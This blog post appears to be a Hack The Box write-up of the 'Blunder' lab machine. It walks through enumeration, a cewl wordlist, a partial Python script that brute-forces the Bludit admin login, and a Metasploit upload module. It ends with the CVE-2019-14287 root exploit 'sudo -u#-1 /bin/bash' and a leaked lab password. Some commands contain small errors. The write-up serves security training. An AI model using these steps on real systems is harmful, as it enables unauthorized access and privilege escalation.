---
layout: post
title:  "Blunder Writeup"
date:   2020-10-18 11:05:18 -0400
categories: HTB Writeup
---

# Blunder Writeup

This is my first real HTB writeup. Blunder is a good example of the importance of enumeration and knowledge of how to debug scripting errors.

## Scanning and Enumeration

First started with an nmap scan.

{% highlight bash %}
nmap -p- A -T4 -oN nmap.txt blunder.htb
{% endhighlight %}

After the scan was completed I saw that only port 80 was open on the machine.
Next step was to run a gobuster.

{% highlight bash %}
gobuster dir -u http://blunder.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x .txt,.php
{% endhighlight %}

After that was completed I found the /admin page. I inspected the source code for version info on the framework. Turns out it was running on bludit version 3.9.2.

![Bludit Version](https://tbernard97.github.io/blog/assets/Blunder/Bludit_version.png)

After doing some research I realized that there is a working exploit available for this version. Apparently the admin page was vulnerable to bruteforce. However I needed user names and passwords. I checked my gobuster output and found another interesting page called todo.txt

![todo.txt](https://tbernard97.github.io/blog/assets/Blunder/todo.png)

Apparently fergus needs images so there is a pretty good chance that he is the administrator.

This next step irritates me but is also somewhat amusing. We need a dictionary to run the bruteforce. After trying rockyou, common-passwords, and many other wordlists I forfitted and went to the forums. People kept mentioning a "cool sccript" and after looking into it I realized what I had to do.

Cewl is a password generation tool that reads a web page and generates a wordlist based off its contents.

{% highlight bash %}
cewl -w wordlist.txt -d 5 -m 10 10.10.10.191
{% endhighlight %}

This generates a wordlist in the working directory.

Next step was to get an exploit script going. Luckilly I found [this site](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) which had one available.

There was a slight problem however. Everytime I ran the code against the wordlist it found no results. It didn't throw any errors it just did not find a password. Now I was convinced that my wordlist was correct. But then it dawned on me. This is a logic error in the code, and this was going to be a pain in the ass to fix.

Several hours later I found out the issue. Apparently when cewl generates a wordlist it adds the metacharacter "\n" in between each word in the file to append line breaks. Now this is fine however we need to modify the script to deal with this.

{% highlight python %}
import requests

host = 'http://10.10.10.191'
login_url = host + 'admin/login'

def open_file(file):
  return [item.replace("\n", "") for item in open(file).readlines()]

username = 'fergus'
wordlist = open_file('/root/HTB/Active/Blunder/wordlist.txt')
{% endhighlight %}

The snippet above shows an item.replace function to remove those pesky metacharacters.

Once this was completed I ran the script and got credentials.


![creds](https://tbernard97.github.io/blog/assets/Blunder/creds.png)

Using these credentials I was able to access the admin dashboard which confirmed that they were valid.

![login](https://tbernard97.github.io/blog/assets/Blunder/dashboard.png)

## Exploitation

I was getting lazy after all that troubleshooting so I just used [this](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/bludit_upload_images_exec.rb) metasploit module to gain initial access.

Using this module I was able to get a shell.

![fergus shell](https://tbernard97.github.io/blog/assets/Blunder/fergus.png)

## Privesc to Hugo

After some basic enumeration (literrally just listed the home directory) I found two other users on the machine. Shaun is useless, he doesn't have a user.txt file however hugo does. Next step was to get creds for hugo. These are typically leaked in configuration files or databases. I used a simple find command to look for a users.php file under /var/www/bludit-3.9.2/

{% highlight bash %}
find /var/www/bludit-3.9.2/bl-content/ -type f users
{% endhighlight %}

After using that command I found Hugo's hash in the users.php file.

![users](https://tbernard97.github.io/blog/assets/Blunder/users.png)

You can literally google the hash and find out the password.

![hugo_pass](https://tbernard97.github.io/blog/assets/Blunder/hugo_pass.png)

## Privesc to root

A sudo -l will give the following output.

{% highlight bash%}
$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
{% endhighlight %}

I thank TheCyberMentor's Udemy course on Linux privesc for this. So this is an example of a machine vulnerable to CVE-2019-14287.

Basically on old versions of sudo appending a -U#-1 will trick the sudo command into interepreting the signed number as 0 when in reality it is something much much bigger.

This causes the machine give the ID of 0 to the command which is the ID for root. Because hugo is allowed to execute /bin/bash under sudo (I have no idea why someone would do this but whatever) abusing this vulnerability means you can get a root shell by typing the following.

{% highlight bash %}
$ sudo -u#-1 /bin/bash
root@blunder:/var/www/bludit-3.9.2/bl-content/tmp# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/var/www/bludit-3.9.2/bl-content/tmp# cat /root/root.txt
cat /root/root.txt

{% endhighlight %}

## Takeaways

This was yet another fun troll box made by egotistcal. I like how his machines require more out of the box thinking than others so shout out to him.

For more info on CVE-2019-14287 click [here](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287).

